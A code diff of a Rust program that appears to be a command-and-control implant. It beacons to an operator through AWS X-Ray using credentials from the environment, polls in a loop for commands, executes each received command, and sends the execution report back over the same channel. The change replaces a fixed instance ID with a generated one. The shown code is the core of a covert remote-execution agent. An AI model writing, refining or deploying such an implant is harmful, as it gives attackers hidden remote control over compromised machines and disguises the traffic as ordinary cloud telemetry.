@@ -22,11 +22,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         env::var("AWS_ACCESS_KEY_ID").expect("AWS_ACCESS_KEY_ID must be set");
     let secret_key =
         env::var("AWS_SECRET_ACCESS_KEY").expect("AWS_SECRET_ACCESS_KEY must be set");
-    
-    let instance_id = "rustinstance001";
+
+    let instance_id = utils::generate_instance_id();
 
     // 1. Inital beacon
-    match utils::publish_metrics(instance_id, "", &access_key, &secret_key) {
+    match utils::publish_metrics(&instance_id, "", &access_key, &secret_key) {
         Ok(()) => {
             tracing::info!("Successfully sent initial beacon AWS X-Ray.");
         }
@@ -39,7 +39,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("\nStarting command polling loop (pauses for 5s between checks)...");    
 
     loop {
-        match utils::poll_configuration(instance_id, &access_key, &secret_key) {
+        match utils::poll_configuration(&instance_id, &access_key, &secret_key) {
             Ok(command) => {
                 if command.is_empty() {
                     print!("."); // Indicate polling is happening
@@ -47,7 +47,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                     tracing::info!("Command received: '{}'", command);
                     let execution_report = execute_command(&command);
                     tracing::info!("Command execution complete. Full Report:\n{}", execution_report);
-                    match utils::publish_metrics(instance_id, &execution_report, &access_key, &secret_key) {
+                    match utils::publish_metrics(&instance_id, &execution_report, &access_key, &secret_key) {
                         Ok(()) => {
                             tracing::info!("Successfully sent command response.");
                         }
